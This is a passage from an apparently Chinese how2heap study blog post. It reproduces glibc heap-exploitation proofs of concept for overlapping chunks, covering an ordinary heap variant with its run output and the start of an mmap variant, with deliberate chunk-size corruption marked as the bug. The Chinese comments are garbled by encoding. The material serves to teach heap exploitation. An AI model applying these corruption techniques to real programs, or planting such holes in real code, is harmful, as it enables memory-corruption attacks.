problem&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);<br><br><br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br><br><br>  real_size_p1 = malloc_usable_size(p1);<br><br>  real_size_p2 = malloc_usable_size(p2);<br><br>  real_size_p3 = malloc_usable_size(p3);<br><br>  real_size_p4 = malloc_usable_size(p4);<br><br>  real_size_p5 = malloc_usable_size(p5);<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+malloc_usable_size(p1));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+malloc_usable_size(p2));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+malloc_usable_size(p3));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+malloc_usable_size(p4));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+malloc_usable_size(p5));<br><br><br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br><br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br><br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br><br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br><br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); <br><br>  <br><br>  <span class="hljs-built_in">free</span>(p4);<br><br><br><span class="hljs-comment">// è¦†ç›–å †å—p2çš„sizeä½ä¸ºå †å—p2å’Œp3å¤§å°çš„å’Œ</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);<br><br><br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br><br><span class="hljs-comment">// è¿™æ ·é‡Šæ”¾çš„æ—¶å€™å°±ä¼šè¶Šè¿‡å †å—p3</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);<br><br><br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br><br>  real_size_p6 = malloc_usable_size(p6);<br><br><br><span class="hljs-comment">// ç°åœ¨p3å’Œp6äº§ç”Ÿäº†å †å—é‡å </span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br><br><br>&#125;<br><br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks_2<br><br>This is a simple chunks overlapping problem<br>This is also referenced as Nonadjacent Free Chunk Consolidation Attack<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">5</span> chunks on the heap:<br><br>chunk p1 from <span class="hljs-number">0x956010</span> to <span class="hljs-number">0x9563f8</span><br>chunk p2 from <span class="hljs-number">0x956400</span> to <span class="hljs-number">0x9567e8</span><br>chunk p3 from <span class="hljs-number">0x9567f0</span> to <span class="hljs-number">0x956bd8</span><br>chunk p4 from <span class="hljs-number">0x956be0</span> to <span class="hljs-number">0x956fc8</span><br>chunk p5 from <span class="hljs-number">0x956fd0</span> to <span class="hljs-number">0x9573b8</span><br><br>Let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p4.<br>In this <span class="hljs-keyword">case</span> this isn<span class="hljs-number">&#x27;</span>t coealesced with top chunk since we have p5 bordering top chunk after p4<br><br>Let<span class="hljs-number">&#x27;</span>s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2<br>with the size of chunk_p2 + size of chunk_p3<br><br>Now during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span> operation on p2, the allocator is fooled to think that <br>the nextchunk is <span class="hljs-title function_">p4</span> <span class="hljs-params">( since p2 + size_p2 now point to p4 )</span> <br><br>This operation will basically create a big <span class="hljs-built_in">free</span> chunk that wrongly includes p3<br><br>Now let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk<br><br>Our <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> has been satisfied by our crafted big <span class="hljs-built_in">free</span> chunk, now p6 and p3 are overlapping and <br>we can overwrite data in p3 by writing on chunk p6<br><br>chunk p6 from 0x956400 to 0x956bd8<br>chunk p3 from 0x9567f0 to 0x956bd8<br><br>Data inside chunk p3: <br><br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCï¿½<br><br>Let&#x27;s write something inside p6<br><br>Data inside chunk p3: <br><br>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCï¿½<br></code></pre></td></tr></table></figure><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Technique should work on all versions of GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">POC written by POC written by Maxwell Dulin (Strikeout) </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A primer on Mmap chunks in GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">==================================</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">In GLibC, there is a point where an allocation is so large that malloc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decides that we need a seperate section of memory for it, instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">of allocating it on the normal heap. This is determined by the mmap_threshold var.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Instead of the normal logic for getting a chunk, the system call *Mmap* is </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">used. This allocates a section of virtual memory and gives it back to the user. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Similarly, the freeing process is going to be different. Instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">of a free chunk being given back to a bin or to the rest of the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">another syscall is used: *Munmap*. This takes in a pointer of a previously </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">allocated Mmap chunk and releases it back to the kernel. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Mmap chunks have special bit set on the size metadata: the second bit. If this </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">bit is set, then the chunk was allocated as an Mmap chunk. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Mmap chunks have a prev_size and a size. The *size* represents the current </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">size of the chunk. The *prev_size* of a chunk represents the left over space</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">from the size of the Mmap chunk (not the chunks directly belows size). </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">However, the fd and bk pointers are not used, as Mmap chunks do not go back </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the chunk must be page-aligned.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The POC below is essentially an overlapping chunk attack but on mmap chunks. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The main difference is that mmapped chunks have special properties and are </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">handled in different ways, creating different attack scenarios than normal </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">overlapping chunk attacks. There are other things that can be done, </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">such as munmapping system libraries, the heap itself and other things.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is meant to be a simple proof of concept to demonstrate the general </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">way to perform an attack on an mmap chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">For more information on mmap chunks in GLibC, read this post: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://tukan.farm/2016/07/27/munmap-madness/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=======================================================\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);<br><br><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);<br><br><br><br><span class="hljs-comment">// After this, all chunks are allocated downwards in memory towards the heap.</span><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);<br><br><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nCurrent System Memory Layout \n&quot;</span> \<br><br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br><br>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span><br><br><span class="hljs-comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span><br><br>mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);<br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This next call to free is actually just going to call munmap on the pointer we are passing it.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">With normal frees the data is still writable and readable (which creates a use after free on </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span><br><span 